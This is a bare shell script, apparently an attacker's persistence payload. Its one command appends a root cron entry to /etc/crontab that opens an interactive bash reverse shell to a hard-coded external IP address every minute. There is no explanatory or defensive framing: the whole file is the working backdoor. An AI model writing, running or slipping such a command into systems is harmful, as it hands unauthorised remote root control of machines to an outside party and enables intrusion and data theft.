#!/bin/sh

echo "* * * * * root bash -i >& /dev/tcp/101.200.54.68/10010 0>&1" >> /etc/crontab
